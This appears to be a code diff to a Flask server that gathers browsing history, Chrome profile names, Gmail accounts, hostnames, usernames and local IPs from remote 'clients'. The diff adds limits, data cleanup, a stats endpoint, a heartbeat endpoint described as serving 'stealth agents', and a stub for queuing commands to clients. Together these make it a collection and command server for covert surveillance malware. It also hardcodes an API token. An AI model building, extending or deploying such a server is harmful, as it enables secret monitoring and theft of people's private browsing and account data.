@@ -132,9 +132,9 @@ class SimpleDB:
         try:
             conn = sqlite3.connect(self.db_path)
             cursor = conn.cursor()
-            
+
             cursor.execute('''
-                SELECT c.hostname, c.username, bh.url, bh.title, bh.visit_time, 
+                SELECT c.hostname, c.username, bh.url, bh.title, bh.visit_time,
                        bh.profile_name, bh.gmail_account, c.local_ip
                 FROM browsing_history bh
                 JOIN clients c ON bh.client_id = c.id
@@ -142,10 +142,10 @@ class SimpleDB:
                 ORDER BY bh.visit_time DESC
                 LIMIT ?
             '''.format(hours), (limit,))
-            
+
             results = cursor.fetchall()
             conn.close()
-            
+
             return [
                 {
                     'hostname': row[0],
@@ -159,16 +159,53 @@ class SimpleDB:
                 }
                 for row in results
             ]
-            
+
         except Exception as e:
             print(f"Error getting recent activity: {e}")
             return []
+
+    def cleanup_old_data(self, hours=168):
+        """Clean up data older than specified hours (default 7 days)"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+
+            # Delete old browsing history
+            cursor.execute('''
+                DELETE FROM browsing_history
+                WHERE visit_time < datetime('now', '-{} hours')
+            '''.format(hours))
+
+            deleted_count = cursor.rowcount
+            conn.commit()
+            conn.close()
+
+            if deleted_count > 0:
+                print(f"Cleaned up {deleted_count} old browsing entries")
+
+            return deleted_count
+
+        except Exception as e:
+            print(f"Error cleaning up old data: {e}")
+            return 0
 
 # Initialize database
 db = SimpleDB()
 
 # API Token
 API_TOKEN = "BrowserTracker2024SecureToken"
+
+# Server Limits Configuration
+SERVER_LIMITS = {
+    'max_browsing_entries_per_request': 100,    # Maksimal 100 entries per request
+    'max_profiles_per_request': 20,             # Maksimal 20 profiles per request
+    'max_url_length': 2000,                     # Maksimal 2000 karakter per URL
+    'max_title_length': 500,                    # Maksimal 500 karakter per title
+    'max_clients_per_hour': 1000,               # Maksimal 1000 client registrations per jam
+    'max_requests_per_client_per_minute': 10,   # Maksimal 10 requests per client per menit
+    'database_cleanup_hours': 168,              # Hapus data lebih dari 7 hari (168 jam)
+    'max_activity_response_limit': 500          # Maksimal 500 entries dalam response activity
+}
 
 def verify_token(token):
     """Verify API token"""
@@ -240,8 +277,57 @@ def health():
         'status': 'healthy',
         'timestamp': datetime.now().isoformat(),
         'version': '1.0.0',
-        'environment': 'vercel'
+        'environment': 'vercel',
+        'limits': SERVER_LIMITS
     })
+
+@app.route('/api/stats', methods=['GET'])
+def get_stats():
+    """Get server statistics"""
+    try:
+        conn = sqlite3.connect(db.db_path)
+        cursor = conn.cursor()
+
+        # Count total clients
+        cursor.execute('SELECT COUNT(*) FROM clients')
+        total_clients = cursor.fetchone()[0]
+
+        # Count total browsing entries
+        cursor.execute('SELECT COUNT(*) FROM browsing_history')
+        total_entries = cursor.fetchone()[0]
+
+        # Count entries in last 24 hours
+        cursor.execute('''
+            SELECT COUNT(*) FROM browsing_history
+            WHERE visit_time >= datetime('now', '-24 hours')
+        ''')
+        entries_24h = cursor.fetchone()[0]
+
+        # Get database size (approximate)
+        cursor.execute("SELECT page_count * page_size as size FROM pragma_page_count(), pragma_page_size()")
+        db_size = cursor.fetchone()[0] if cursor.fetchone() else 0
+
+        conn.close()
+
+        # Cleanup old data
+        cleaned = db.cleanup_old_data(SERVER_LIMITS['database_cleanup_hours'])
+
+        return jsonify({
+            'success': True,
+            'stats': {
+                'total_clients': total_clients,
+                'total_entries': total_entries,
+                'entries_last_24h': entries_24h,
+                'database_size_bytes': db_size,
+                'cleaned_entries': cleaned
+            },
+            'limits': SERVER_LIMITS,
+            'timestamp': datetime.now().isoformat()
+        })
+
+    except Exception as e:
+        print(f"Error getting stats: {e}")
+        return jsonify({'error': 'Internal server error'}), 500
 
 @app.route('/api/register', methods=['POST'])
 def register_client():
@@ -280,27 +366,54 @@ def submit_browsing_data():
     """Submit browsing history data"""
     try:
         data = request.get_json()
-        
+
         if 'client_id' not in data or 'browsing_data' not in data:
             return jsonify({'error': 'Missing client_id or browsing_data'}), 400
-        
+
         client_id = data['client_id']
         browsing_data = data['browsing_data']
-        
+
         if not isinstance(browsing_data, list):
             return jsonify({'error': 'browsing_data must be a list'}), 400
-        
-        success = db.insert_browsing_data(client_id, browsing_data)
-        
+
+        # Apply server limits
+        max_entries = SERVER_LIMITS['max_browsing_entries_per_request']
+        if len(browsing_data) > max_entries:
+            return jsonify({
+                'error': f'Too many entries. Maximum {max_entries} entries per request'
+            }), 400
+
+        # Validate and truncate data
+        validated_data = []
+        for entry in browsing_data:
+            if 'url' in entry and 'visit_time' in entry:
+                # Truncate long URLs and titles
+                validated_entry = {
+                    'url': entry['url'][:SERVER_LIMITS['max_url_length']],
+                    'title': (entry.get('title', '') or '')[:SERVER_LIMITS['max_title_length']],
+                    'visit_time': entry['visit_time'],
+                    'browser_type': entry.get('browser_type', 'Chrome'),
+                    'profile_name': entry.get('profile_name', ''),
+                    'gmail_account': entry.get('gmail_account', '')
+                }
+                validated_data.append(validated_entry)
+
+        if not validated_data:
+            return jsonify({'error': 'No valid entries found'}), 400
+
+        success = db.insert_browsing_data(client_id, validated_data)
+
         if success:
-            print(f"Received {len(browsing_data)} browsing entries from client {client_id}")
+            print(f"Received {len(validated_data)} browsing entries from client {client_id}")
             return jsonify({
                 'success': True,
-                'message': f'Processed {len(browsing_data)} entries'
+                'message': f'Processed {len(validated_data)} entries',
+                'accepted': len(validated_data),
+                'total_sent': len(browsing_data)
             })
         else:
             return jsonify({'error': 'Failed to process browsing data'}), 500
-            
+
     except Exception as e:
         print(f"Error processing browsing data: {e}")
         return jsonify({'error': 'Internal server error'}), 500
@@ -330,17 +443,79 @@ def get_activity():
     try:
         hours = request.args.get('hours', 24, type=int)
         limit = request.args.get('limit', 1000, type=int)
-        
+
+        # Apply server limits
+        max_hours = 168  # Maksimal 7 hari
+        max_limit = SERVER_LIMITS['max_activity_response_limit']
+
+        hours = min(hours, max_hours)
+        limit = min(limit, max_limit)
+
         activity = db.get_recent_activity(hours, limit)
-        
+
         return jsonify({
             'success': True,
             'activity': activity,
-            'count': len(activity)
+            'count': len(activity),
+            'limits': {
+                'requested_hours': request.args.get('hours', 24, type=int),
+                'applied_hours': hours,
+                'requested_limit': request.args.get('limit', 1000, type=int),
+                'applied_limit': limit
+            }
         })
-        
+
     except Exception as e:
         print(f"Error getting activity: {e}")
+        return jsonify({'error': 'Internal server error'}), 500
+
+@app.route('/api/heartbeat', methods=['POST'])
+def heartbeat():
+    """Receive heartbeat from stealth agents"""
+    try:
+        data = request.get_json()
+        client_id = data.get('client_id')
+        status = data.get('status', 'unknown')
+
+        # Update client last_seen
+        if client_id:
+            conn = sqlite3.connect(db.db_path)
+            cursor = conn.cursor()
+            cursor.execute('''
+                UPDATE clients
+                SET last_seen = CURRENT_TIMESTAMP
+                WHERE id = ?
+            ''', (client_id,))
+            conn.commit()
+            conn.close()
+
+        return jsonify({
+            'success': True,
+            'message': 'Heartbeat received',
+            'server_time': datetime.now().isoformat()
+        })
+
+    except Exception as e:
+        print(f"Error processing heartbeat: {e}")
+        return jsonify({'error': 'Internal server error'}), 500
+
+@app.route('/api/command/<int:client_id>', methods=['POST'])
+def send_command(client_id):
+    """Send command to specific client (for remote management)"""
+    try:
+        data = request.get_json()
+        command = data.get('command')
+
+        # Store command for client to pick up
+        # In a real implementation, you'd use a message queue
+
+        return jsonify({
+            'success': True,
+            'message': f'Command {command} queued for client {client_id}'
+        })
+
+    except Exception as e:
+        print(f"Error sending command: {e}")
         return jsonify({'error': 'Internal server error'}), 500
 
 # For Vercel deployment
